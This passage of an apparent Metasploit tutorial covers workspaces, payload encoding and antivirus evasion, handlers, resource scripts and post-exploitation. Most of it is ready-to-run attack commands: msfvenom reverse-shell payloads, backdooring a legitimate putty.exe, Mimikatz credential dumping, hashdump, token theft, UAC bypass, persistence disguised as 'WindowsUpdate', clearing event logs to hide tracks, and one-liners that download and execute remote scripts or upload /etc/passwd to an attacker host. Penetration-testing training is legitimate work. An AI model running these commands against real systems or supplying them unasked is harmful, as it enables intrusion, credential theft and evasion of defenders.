RHOSTS => 192.168.1.10 192.168.1.11 192.168.1.12
```


## Services Management

|Command |Purpose|
|----|----|
|services| List all services|
|services -p [port]| List services on specific port|
|services -r [protocol]| List services by protocol (tcp/udp)|
|services -u| List only running services|
|services -d [ip] |Delete services for a host|

- **Example: Find all web servers**

```bash
services -p 80 -p 443 -p 8080
```

- **Example: Show SMB services (port 445)**

```bash
services -p 445
```


## Credentials Management

|Command| Purpose|
|----|----|
|creds |List all credentials|
|creds -a| Add a credential|
|creds -d| Delete credentials|
|creds -h |Show help|

- **Example: Add a discovered credential**

```bash
creds add user:administrator pass:password123 host:192.168.1.10
```

- **Example: List stored credentials**

```bash
creds
```


## Vulnerabilities Management

|Command |Purpose|
|----|----|
|vulns| List all vulnerabilities|
|vulns -d |Delete vulnerabilities|
|vulns -h| Show help|

- When you run check on an exploit and it confirms vulnerability, Metasploit automatically adds it to the vulns table.


## Loot Management

- Loot is data collected during post-exploitation (hashes, screenshots, downloaded files).

|Command |Purpose|
|----|----|
|loot |List all loot|
|loot -d |Delete loot|
|loot -h |Show help|


## Notes Management

- Add custom notes to hosts.

|Command |Purpose|
|----|----|
|notes| List all notes|
|notes -a [text]| Add a note to current host|
|notes -d |Delete notes|

- **Example: Add a note**

```bash
notes -a "This host runs an outdated Apache 2.2"
```


## Reporting Commands

- Generate reports from database contents.

|Command |Format| Purpose|
|----|----|----|
|report| HTML |Generate HTML report|
|report XML| Generate XML report|
|report CSV |Generate CSV report|

- **Example: Generate HTML report**

```bash
report -f html -o /tmp/report.html
```


## Database Maintenance

|Command| Purpose|
|----|----|
|db_connect [name]| Connect to a database|
|db_disconnect| Disconnect from database|
|db_remove [name]| Remove a database|
|db_rebuild_cache| Rebuild module cache|


## Real-World Database Workflow


- Start PostgreSQL and msfconsole with database
```bash
sudo systemctl start postgresql
msfconsole -d
```
- Create a workspace for your target
```bash
workspace -a TargetCorp
```
- Import an Nmap scan
```bash
db_import /home/user/nmap_scan.xml
```
- List discovered hosts
```bash
hosts
```
- List services (look for interesting ports)
```bash
services -p 80 -p 443 -p 445 -p 3306
```
- Set RHOSTS to all discovered hosts
```bash
hosts -R
```
- Find exploits for discovered services
```bash
search type:exploit platform:windows name:smb
```
- After exploitation, add credentials
```bash
creds add user:Administrator pass:P@ssw0rd host:192.168.1.10
```
- Generate a report
```bash
report -f html -o /tmp/TargetCorp_report.html
```
- Save your work
```bash
workspace -a TargetCorp_COMPLETED
```


## Common Database Commands Cheat Sheet

|Task| Command|
|----|----|
|Check connection| db_status|
|Create workspace| workspace -a [name]|
|Switch workspace| workspace [name]|
|List workspaces| workspace|
|Import scan| db_import [file]|
|List hosts |hosts|
|List services |services|
|Set RHOSTS from hosts| hosts -R|
|List credentials| creds|
|List vulnerabilities| vulns|
|Generate report| report -f html -o [file]|



# 7. Encoders and Evasion

### What Are Encoders?

- Encoders transform a payload into a different representation to avoid detection by antivirus (AV) and intrusion detection systems (IDS). They don't make payloads "undetectable forever," but they can help evade signature-based detection.

**Common use cases:**
- Bypassing simple antivirus signatures
- Avoiding character blacklists in exploits
- Shrinking or expanding payload size

> **Important:** Modern EDR (Endpoint Detection and Response) is not fooled by basic encoding. Use encoders as one layer, not your only defense.

---

### Finding Encoders

| Command | Purpose |
|---------|---------|
| `show encoders` | List all available encoders |
| `msfvenom -l encoders` | List encoders from command line |

**Example output:**
```text
msf6 > show encoders
```

### Compatible Encoders
 
  | Name     |               Rank   |    Description|
 |  ----              |      ----     |  -----------|
  | cmd/brace    |           low   |     Brace Expansion|
  | cmd/echo  |             low    |    Echo Command|
  | generic/none    |        normal |    The "none" Encoder|
  | x86/shikata_ga_nai    |  excellent  |Polymorphic XOR Additive Feedback Encoder|


## Encoder Rankings

|Rank	|Meaning	|Reliability|
|----|----|----|
|excellent	|Very reliable, should bypass most signature-based AV|	Best choice|
|great|	Reliable, good for most situations|	Good choice|
|good	|Works in many cases	|Decent choice|
|normal	|Standard, might be detected	|Try if others fail|
|low	|Rarely works, old signatures	|Last resort|
|manual	|Requires manual tweaking	|Advanced users only|


## The Most Useful Encoder: shikata_ga_nai

x86/shikata_ga_nai (Japanese for "it can't be helped") 
- is the most popular encoder in Metasploit. It's polymorphic—each generated payload looks different.

- **Why it works:**

  - XOR encryption with random keys

  - Multiple iterations change the payload each time

  -  Self-decrypting code evades simple pattern matching
 

 ## Using Encoders in msfconsole

- When setting a payload for an exploit, you can also set an encoder:
```bash
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.5
 set LPORT 4444
 show encoders
 set encoder x86/shikata_ga_nai
 set iterations 5
 run
```
|Parameter	|Purpose|
|----|----|
|set encoder [name]|	Choose which encoder to use|
|set iterations [number]|	How many times to encode (1-10, default 1)|


## Using Encoders with msfvenom

- Most encoding happens during payload generation with msfvenom.

- **Basic encoded payload:**
```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp
  LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe
```
- **Multiple iterations (more encoding passes):**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5
LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
```
|Flag	|Purpose	|Example|
|----|----|----|
|-e|	Encoder to use	|-e x86/shikata_ga_nai|
|-i	|Iterations|	-i 5 (5 encoding passes)|


## Evasion Techniques

- Evasion isn't just about encoders. Multiple techniques can help you avoid detection.

- 1. Use stageless payloads
Stageless payloads are larger but sometimes bypass certain AV heuristics.
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o stageless.exe
```
- 2. Use PowerShell instead of EXE
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1
```
- 3. Use different output formats

|Format	|Command	|use Case|
|----|----|----|
|EXE|	-f exe	|Windows executables|
|PowerShell|	-f psh-reflection|	Run from PowerShell|
|VBA	|-f vba	|Office macros|
|C	|-f c	|Manual compilation|
|Python	|-f python|	Cross-platform|
|Java|	-f jar	|Java applications|

- 4. Embed payload in legitimate executable
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/putty.exe -f exe -o putty_backdoor.exe
     ```
   - The "-x"flag uses a legitimate executable as a template. The payload runs first, then the original program runs normally.

- 5. Use custom templates
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/legitimate.exe -k -f exe -o backdoor.exe
```
- The "-k" flag runs the payload in a separate thread, keeping the original program functional.



## Additional Evasion Options

|Flag	|Purpose	|Example|
|---|----|----|
|-n	|Add NOP sled	|-n 32 (32 byte NOP sled)|
|-s	|Maximum size of encoded payload	|-s 4096|
|-b	|Bad characters to avoid	|-b '\x00\xff'|

- **Bad characters example:**
 - Some exploits can't handle certain characters (like null bytes \x00). The encoder will avoid generating those characters.
 ```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o shell.exe
 ```

## Limitations of Encoders
|Limitation|	Why It Matters|
|----|----|
|Modern EDR uses behavior detection|	Encoders only fool signature-based AV|
|Encoded payloads still run in memory|EDR sees what the payload does, not how it's encoded|
|Multiple iterations can break payloads|	Over-encoding can corrupt the payload|
|Some encoders are blacklisted|	Known encoder signatures are detected|

>**Real talk:** Basic encoders like "shikata_ga_nai" won't bypass modern EDR (CrowdStrike, SentinelOne, Defender for Endpoint). For real evasion, you need >advanced techniques like process injection, custom crypters, or living-off-the-land techniques.


## The Real Evasion Pyramid
|Level	|Technique	|Effectiveness|
|----|----|----|
|1. Basic	|Encoders (shikata_ga_nai)	|Bypasses old AV only|
|2. Custom|	Private encoders, custom templates|Better, still may be caught|
|3. Advanced	|Process injection, unhooking	|Bypasses many EDRs|
|4. Expert|	BYOVD (Bring Your Own Vulnerable Driver), kernel callbacks	|High-end evasion|

- Your Metasploit encoders are Level 1. Useful for legacy systems and CTFs. Not useful against modern corporate defenses.


## Common Encoder Workflows

- Quick encoded EXE:
 ```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
```

- Encoded PowerShell payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f psh-reflection -o payload.ps1
```

- Encoded payload embedded in legitimate EXE:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -e x86/shikata_ga_nai -i 5 -f exe -o putty_backdoor.exe
```


## Testing Your Payload

- Before using a payload, test it:

   - Upload to VirusTotal (use a disposable VM, not your real IP)

   - Test against Windows Defender on a local VM

   -  Use online sandboxes (Joe Sandbox, ANY.RUN) with caution

   >Warning: Never upload real payloads to VirusTotal. They'll be shared with AV companies. Use a VPN or test in isolated VMs.



## Evasion Cheat Sheet
|Goal|	Command|
|----|----|
|List encoders|show encoders|
|Use basic encoder	|set encoder x86/shikata_ga_nai|
|Multiple iterations (msfconsole)	|set iterations 5|
|Encoded EXE (msfvenom)	|msfvenom -p [payload] -e [encoder] -f exe -o [file]|
|Encoded PowerShell	|msfvenom -p [payload] -e [encoder] -f psh-reflection -o [file]|
|Embed in legitimate EXE	|msfvenom -p [payload] -x [legit.exe] -f exe -o backdoor.exe|
|Avoid bad characters	|msfvenom -b '\x00\xff'|




# 8. Handlers and Listeners

### What Is a Handler?

A handler is a listener that waits for a payload to connect back to you. When an exploit succeeds and the payload runs on the target, the payload reaches out to your handler, and you get a session.

**Without a handler, you have no session.**

---

### The Multi/Handler Module

`exploit/multi/handler` is the universal listener. It works with any payload (Windows, Linux, Android, etc.).

**Basic setup:**
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run
```
- Now wait. When your payload executes, you'll get a session.



## Handler Options

|Option |Purpose |Example|
|----|----|----|
|LHOST |Your IP address (where payload connects back to) |set LHOST 192.168.1.5|
|LPORT |Your listening port| set LPORT 4444|
|ExitOnSession| Exit handler after one session? |set ExitOnSession false|
|ReverseListenerBindAddress| Bind to specific interface |set ReverseListenerBindAddress 192.168.1.5|
|ReverseAllowProxy| Allow connections through proxy| set ReverseAllowProxy true|


## Multiple Sessions (Keep Handler Running)

- By default, the handler exits after the first session. To handle multiple connections:

```bash
set ExitOnSession false
run -j
```

- "-j" runs the handler as a background job
- "ExitOnSession" false keeps the handler alive after each session


## Running Handler as a Background Job

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
run -j
```

- Now you have a persistent listener running in the background. You can continue using msfconsole while it listens.

- **Check running jobs:**

```bash
jobs
```

- **Kill a job:**

```bash
jobs -k [job_id]
```


## Handling Different Payload Types

|Payload Type |Handler Setup| Notes|
|----|----|----|
|reverse_tcp |set payload windows/x64/meterpreter/reverse_tcp |Most common|
|reverse_http| set payload windows/x64/meterpreter/reverse_http| Blends with web traffic|
|reverse_https| set payload windows/x64/meterpreter/reverse_https| Encrypted|
|bind_tcp |set payload windows/x64/meterpreter/bind_tcp, set RHOST 192.168.1.10| Target connects to you? No, you connect to target|

- **For bind payloads (target listens, you connect):**
  
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 192.168.1.10
set LPORT 4444
run
```


## Auto-Run Scripts on Session Open

- You can automatically run commands or scripts when a session opens.

- **Option 1: Auto-run Meterpreter commands**

```bash
set AutoRunScript migrate -f
```

- **Option 2: Auto-run resource script**

```bash
set AutoRunScript multi_console_command -r /path/to/script.rc
```

- **Example resource script (auto.rc):**

```bash
getuid
sysinfo
run post/windows/gather/hashdump
```

- **Then set:**

```bash
set AutoRunScript multi_console_command -r /path/to/auto.rc
```

- When a session opens, it automatically runs those commands.


## Payload Configuration for Specific Targets

- **Windows 10/11 (x64)**

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

- **Windows 7 (x86)**

```bash
set payload windows/meterpreter/reverse_tcp
```

- **Linux**

```bash
set payload linux/x64/meterpreter/reverse_tcp
```

- **macOS**

```bash
set payload osx/x64/meterpreter/reverse_tcp
```

- **Android**

```bash
set payload android/meterpreter/reverse_tcp
```


## Real-World Handler Workflow

```bash
- Start msfconsole with database
```bash 
msfconsole -d
```
- Create a workspace
```bash 
workspace -a Engagement1
```
- Set up handler
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
```
- Run as background job

```bash
run -j
```
- Verify it's running
```bash 
jobs
```
- Now run your exploit or deliver your payload...
- When payload runs, you'll get a session automatically

- Interact with session when it arrives
```bash 
sessions
```
- To stop the handler when done
```bash 
jobs -k [job_id]
```


## Common Handler Issues and Fixes

|Problem |Cause |Solution|
|----|----|----|
|Payload runs but no session |Wrong LHOST or firewall blocking| Check IP, disable firewall, use port 443|
|Connection refused| No listener running| Start handler before running payload|
|Session drops immediately |Unstable payload or network| Use different payload, add pingback option|
|Multiple sessions not working |ExitOnSession is true| Set ExitOnSession false|
|Payload connects to wrong IP| Staged payload with wrong LHOST |Regenerate payload with correct LHOST|



## Testing Your Handler Setup

- **Step 1: Start handler**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run
```

- **Step 2: Generate test payload**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o test.exe
```

- **Step 3: Run test.exe on your own Windows VM**

- **Step 4: Check handler output**

```text
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Sending stage (200774 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened
```

- If you see this, your handler is working correctly.


## Handler Cheat Sheet

|Task| Command|
|----|----|
|Start handler| use exploit/multi/handler|
|Set payload| set payload [path]|
|Set your IP| set LHOST [IP]|
|Set your port| set LPORT [port]|
|Keep handler alive| set ExitOnSession false|
|Run in background |run -j|
|List jobs| jobs|
|Kill job| jobs -k [id]|
|List sessions| sessions|
|Interact with session |sessions -i [id]|





# 9. Resource Scripts

### What Are Resource Scripts?

- Resource scripts (`.rc` files) are text files containing Metasploit commands that run automatically.
- Instead of typing the same setup commands every time, you save them to a file and load them.

**Use cases:**
- Automated listener setup
- Consistent workspace configuration
- Repeating the same scan across multiple targets
- Saving complex exploit chains

---

### Basic Resource Script Example

- Create a file called `listener.rc`:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
run -j
```

- **Run it:**

```bash
msfconsole -r listener.rc
```

- Metasploit executes every command in the file in order.



## Running Resource Scripts

|Method |Command|
|----|----|
|From command line| msfconsole -r script.rc|
|From inside msfconsole| resource script.rc|
|From inside msfconsole (shortcut) |resource script.rc|
|From Meterpreter session| run resource script.rc|


## Full Automation Example

- **File: setup.rc**


- Database setup
```bash
db_connect postgresql://user:pass@localhost/msf
workspace -a TargetProject
```
- Load external modules if needed
```bash
loadpath /path/to/custom/modules
```
- Set up handler
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
run -j
```
- Print status
```bash
echo "[*] Handler running. Waiting for connections..."
```

- **Run it:**

```bash
msfconsole -r setup.rc
```


## Multi-Stage Resource Scripts

- You can chain scripts together.

- **File: stage1.rc**

```bash
workspace -a Engagement
db_import /home/user/nmap_scan.xml
hosts -R
```

- **File: stage2.rc**

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS file:/tmp/ip_list.txt
set THREADS 10
run
```

- **Run them sequentially:**

```bash
msfconsole -r stage1.rc -r stage2.rc
```

  - **Or from inside msfconsole:**

```bash
msf6 > resource stage1.rc
msf6 > resource stage2.rc
```

## Meterpreter Resource Scripts

- You can also run resource scripts from inside a Meterpreter session.

- **File: collect.rc**

```bash
getuid
sysinfo
hashdump
screenshot
run post/windows/gather/enum_logged_on_users
download C:\Users\Administrator\Desktop\*.txt /tmp/loot/
```

- **Run it from Meterpreter:**

```bash 
meterpreter > run resource collect.rc
```


## Advanced Resource Script Features

- **Variables**
  

   - Set a variable
       ```bash
       set VARNAME value
       ```
    - Use it later
      ```bash
      echo $VARNAME
      ```

- **Conditional execution**


- If a command fails, continue anyway
```bash
db_import /path/to/file.xml || echo "Import failed, continuing..."
```

- **Comments (use #)**


  - This is a comment:
```bash
set LHOST 192.168.1.5   # This is also a comment
```


## Common Resource Script Templates

- **Handler template (handler.rc):**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
exploit -j
```

- **Scanner template (scanner.rc):**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 10
run
hosts -R
services -u
```

- **Full engagement template (engagement.rc):**

```bash
workspace -a $ARG0
db_import /home/user/$ARG0_nmap.xml
hosts -R
use auxiliary/scanner/smb/smb_version
set RHOSTS file:/tmp/hosts.txt
run
services -p 445
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:/tmp/smb_hosts.txt
check
```

- **Run with argument:**

```bash
msfconsole -q -r engagement.rc TargetCorp
```
- ($ARG0 becomes "TargetCorp")


## Creating a Persistent Resource Script

- Save your preferred environment setup in **~/.msf4/msfconsole.rc.** Metasploit runs this file automatically on startup.

- **Example ~/.msf4/msfconsole.rc:**

```bash
db_connect postgresql://user:pass@localhost/msf
loadpath /opt/custom-modules
setg LHOST 192.168.1.5
setg LPORT 4444
echo "[*] Environment loaded. Happy hacking."
```

Now every time you run **msfconsole**, your environment is pre-configured.



## Resource Scripts vs. Aliases

|Feature| Resource Script| Alias|
|----|----|----|
|Saves commands| Yes| Limited|
|Supports arguments |Yes (with $ARG0, $ARG1) |No|
|Runs files| Yes| No|
|Multi-line| Yes| No|
|Complexity| High |Low|

- **Alias example (in msfconsole):**

```bash
alias h setg LHOST 192.168.1.5; setg LPORT 4444
```

- Now typing **h** sets your global listener



## Practical Examples

- **Example 1: Quick listener**

```bash
# save as listen.rc
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run
```

- **Example 2: SMB scan chain**

```bash
# save as smb_scan.rc
workspace -a SMB_Engagement
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run
services -p 445 -u
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS file:/tmp/445_hosts.txt
run
```

- **Example 3: Post-exploitation collection**

```bash
# save as collect.rc
getuid
sysinfo
ifconfig
route
hashdump
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
download C:\Users\*\Desktop\*.txt /tmp/loot/
screenshot
```


## Cheat Sheet

|Task |Command|
|----|----|
|Run script from command line| msfconsole -r script.rc|
|Run script from msfconsole| resource script.rc|
|Run script from Meterpreter| run resource script.rc|
|Auto-run script on startup| Save to ~/.msf4/msfconsole.rc|
|Use arguments| $ARG0, $ARG1 in script|
|Comment| # Comment text|
|Set variable |set VARNAME value|
|Use variable| echo $VARNAME|




# 10. Advanced Techniques

- **This section covers methods that go beyond basic exploitation. These techniques assume you already understand core Metasploit functionality.**

---

### 1. Payload Chaining

Run multiple payloads sequentially on the same target.

- **Method 1: Use a script to call multiple payloads
  Create a resource script that delivers multiple payloads:**

  - multi_payload.rc:

```bash

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
run -j

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4445
set ExitOnSession false
run -j
```

- **Method 2: Meterpreter's execute command
From an existing session, run another payload:**
```bash
meterpreter > upload /path/to/second_payload.exe C:\\Windows\\Temp\\
meterpreter > execute -f C:\\Windows\\Temp\\second_payload.exe -H
```

## 2. Pivoting (Network Tunneling)

- **Use a compromised host to access networks you can't reach directly.**

 - Step 1: Add route through compromised host
   ```bash
   meterpreter > background
   msf6 > route add 192.168.2.0 255.255.255.0 1
   ```
- Step 2: Scan through the pivot
  ```bash
  msf6 > use auxiliary/scanner/portscan/tcp
  set RHOSTS 192.168.2.0/24
  set PORTS 445
  run
  ```

- Step 3: Use socks proxy for external tools
  ```bash
  msf6 > use auxiliary/server/socks_proxy
  set SRVHOST 127.0.0.1
  set SRVPORT 1080
  run -j
  ```
  - Now configure your tools to use SOCKS proxy 127.0.0.1:1080. Tools like nmap, curl, and proxychains can now reach the remote network through the compromised host.


## 3. Port Forwarding

**Create direct tunnels to remote services through the compromised host.**

 - Local port forward (access remote service through your local port):
  ```bash
  meterpreter > portfwd add -l 8080 -p 80 -r 192.168.2.20
  [*] Local TCP relay created: :8080 -> 192.168.2.20:80
  ```
  - Now open http://localhost:8080 in your browser to access http://192.168.2.20:80.

- Remote port forward (give remote access to your local service):
  ```bash
  meterpreter > portfwd add -L -l 4444 -p 4444 -r 127.0.0.1
  ```
- List active forwards:
  ```bash
   meterpreter > portfwd list
  ```
- Delete a forward:
  ```bash
  meterpreter > portfwd delete -l 8080
  ```

## 4. AutoRunScripts

**Automatically run Meterpreter commands when a session opens.**

- During handler setup:
  ```bash
  set AutoRunScript migrate -f
  ```

- **Common AutoRunScripts:**

|Script	|Purpose|
|----|----|
|migrate -f	|Migrate to a trusted process (e.g., explorer.exe)|
|run post/windows/gather/hashdump	|Dump hashes immediately|
|run post/windows/gather/enum_logged_on_users	|Enumerate users|
|multi_console_command -r /path/to/script.rc	|Run a resource script|

- Multiple commands:
 ```bash
 set AutoRunScript migrate -f, post/windows/gather/hashdump
 ```

## 5. Incognito (Token Manipulation)

**Use stolen tokens to impersonate other users on the system.**

- Load incognito:
 ```bash
 meterpreter > load incognito
 ```
- List available tokens:
  ```bash
  meterpreter > list_tokens -u
  ```
- Impersonate a user:
  ```bash
  meterpreter > impersonate_token "DOMAIN\\Administrator"
  ```
- Impersonate by PID:
  ```bash
  meterpreter > steal_token 2468
  ```
- Impersonate SYSTEM:
  ```bash
  meterpreter > getsystem
  ```
- Revert to original token:
  ```bash
  meterpreter > rev2self
  ```

## 6. Kiwi (Mimikatz) Advanced Usage

**Extract credentials from memory.**

- Load kiwi:
  ```bash
  meterpreter > load kiwi
  ```
- Dump all credentials:
  ```bash
  meterpreter > creds_all
  ```
- Dump specific credential types:
  ```bash
  meterpreter > creds_msv       # SAM hashes
  meterpreter > creds_kerberos  # Kerberos tickets
  meterpreter > creds_wdigest   # Plaintext passwords (if available)
  meterpreter > creds_livessp   # Live SSP credentials
  ```
- Get system information from Kiwi:
  ```bash
  meterpreter > kiwi_cmd "privilege::debug"
  meterpreter > kiwi_cmd "sekurlsa::logonpasswords"
  ```

## 7. Post-Exploitation Modules

**Metasploit has dedicated post-exploitation modules for specific tasks.**

- List post modules:
  ```bash
  show post
  ```
|Module	|Purpose|
|----|----|
|post/windows/gather/hashdump	|Dump SAM hashes|
|post/windows/gather/enum_logged_on_users	|List logged users|
|post/windows/gather/checkvm	|Check if target is a VM|
|post/windows/gather/enum_applications|	List installed software|
|post/windows/gather/credentials/credential_collector|Collect credentials from various sources|
|post/linux/gather/enum_configs	|Enumerate Linux config files|

- Run a post module:
  ```bash
  use post/windows/gather/hashdump
  set SESSION 1
  run
  ```


## 8. Persistence Techniques

**Keep access after reboots.**

- Option 1: Using built-in persistence module
 ```bash
 meterpreter > run persistence -A -X -i 10 -p 4444 -r 192.168.1.5
 ```

|Flag|	Purpose|
|-A	|Auto-start handler after installation|
|-X	|Run at system startup (all users)|
|-i 10	|Reconnect every 10 seconds|
|-p	|Port to connect to|
|-r|	Your IP address|

- Option 2: Manual persistence (SchTasks)
  ```bash
  meterpreter > execute -f schtasks -a "/create /tn 'WindowsUpdate' /tr 'C:\Windows\Temp\backdoor.exe' /sc onstart /ru SYSTEM"
  ```
- Option 3: Registry run key
  ```bash
  meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v WindowsUpdate -d C:\\Windows\\Temp\\backdoor.exe
  ```

## 9. Bypassing UAC (User Account Control)

**If you have a low-priv session, you may need to bypass UAC to get admin access.**

- Search for UAC bypass modules:
 ```bash
 search type:exploit name:uac
 ```
- Common UAC bypasses:
  ```bash
  use exploit/windows/local/ms16_032_secondary_logon_handle
  set SESSION 1
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST 192.168.1.5
  run
  ```
- Using the bypassuac module:
  ```bash
  use exploit/windows/local/bypassuac
  set SESSION 1
  run
  ```


## 10. Event Log Manipulation

**Clear or modify logs to cover your tracks.**

- Clear Windows Event Logs:
  ```bash
  meterpreter > execute -f wevtutil -a "cl System"
  meterpreter > execute -f wevtutil -a "cl Security"
  meterpreter > execute -f wevtutil -a "cl Application"
  ```

- From PowerShell (more thorough):
  ```bash
  powershell -Command "Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }"
  ```

## 11. Living Off the Land (LotL)

**Use built-in OS tools instead of dropping custom executables.**

- Windows LotL examples:
 - Execute PowerShell script remotely
  ```bash
  powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/run.ps1')"
  ```
 - Use Bitsadmin to download file
  ```bash
  bitsadmin /transfer job /download /priority high http://192.168.1.5/shell.exe C:\\Windows\\Temp\\shell.exe
  ```
 - Use certutil to decode base64 payload
  ```bash
  certutil -decode C:\\Windows\\Temp\\encoded.txt C:\\Windows\\Temp\\decoded.exe
  ```

- Linux LotL examples:
  - Use wget to download
  ```bash
  wget http://192.168.1.5/shell.sh -O /tmp/shell.sh
  ```
  - Use curl to upload
  ```bash
  curl -F "data=@/etc/passwd" http://192.168.1.5/upload
  ```
  - Use python to spawn a shell
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```


## 12. Meterpreter Stealth Tips

|Technique	|Command|
|----|----|
|Migrate to trusted process|	migrate 2528 (explorer.exe)|
|Clear command history	|clear (from Meterpreter)|
|Run without logs (PowerShell)	|powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File payload.ps1|
|Use stageless payloads|set payload windows/x64/meterpreter_reverse_tcp|
|Encrypt C2 traffic	|Use reverse_https for TLS encryption|



## 13. Custom Payload Generation with msfvenom

- Create a stageless payload:
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o stageless.exe
 ```
- Create a payload that executes from memory (no disk):
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f exe -o /tmp/shell.exe
 ```
- Create a payload in a different language:
 - Python
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f python -o payload.py
   ```
 - C
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c -o payload.c
   ```
 - PowerShell  
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1
   ```


## Advanced Techniques Cheat Sheet
|Technique|	Key Command|
|----|----|
|Pivot	|route add [subnet] [netmask] [session]|
|Port forward|	portfwd add -l [local] -p [remote] -r [ip]|
|AutoRunScript	|set AutoRunScript migrate -f|
|Incognito	|load incognito, impersonate_token [user]|
|Kiwi|	load kiwi, creds_all|
|Persistence|	run persistence -A -X -i 10 -p [port] -r [ip]|
|UAC bypass|	use exploit/windows/local/bypassuac|
|Clear logs	|wevtutil cl System|
|LotL download (Windows)	|certutil -decode|
|Migrate process|	migrate [PID]|




# 11. Troubleshooting

- This section covers common problems and their solutions. When things don't work, check here first.

---

### 1. Handler Issues

| Problem | Likely Cause | Solution |
|---------|--------------|----------|
| Payload runs but no session | Wrong LHOST or firewall blocking | Set LHOST to correct IP (use `ip a` to check). Ensure no firewall blocking your port |
| "Connection refused" | No listener running | Start handler before running payload |
| Session drops immediately | Unstable payload or network | Try a different payload type (stageless, reverse_https) |
| Multiple sessions not working | `ExitOnSession` is true | Set `ExitOnSession false` |
| Handler sees connection but no session | Payload architecture mismatch | Check if target is 32-bit vs 64-bit. Use correct payload |

**Example: Check if your port is open**
```bash
netstat -tulpn | grep 4444
```

## 2. Payload Generation Problems
|Problem|	Likely Cause	|Solution|
|----|----|----|
|"Payload failed to load"	|Wrong payload name	|Check show payloads for correct syntax|
|Payload crashes target|	Over-encoding or incompatible|	Use fewer iterations (-i 1), try different payload|
|Antivirus detects payload instantly	|Basic encoding not enough|	Use stageless payload, custom template, or different encoder|
|Payload won't execute on target|	Missing dependencies (e.g., .NET Framework)|	Use a different payload that doesn't require the missing dependency|

- **Test if your payload works:**
  ```bash
  # Generate test payload
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o test.exe

  * Run on your own VM. Check handler. If it works, your setup is correct.
  ```


## 3. Exploit Issues
|Problem	|Likely Cause|	Solution|
|----|----|----|
|"Exploit completed, but no session"	|Payload didn't connect	|Check LHOST, LPORT, firewall|
|"Target is not vulnerable"|	Patch has been applied|	Find a different exploit or vector|
|Exploit crashes target	|Wrong target type or version|	Use show targets and select correct target number|
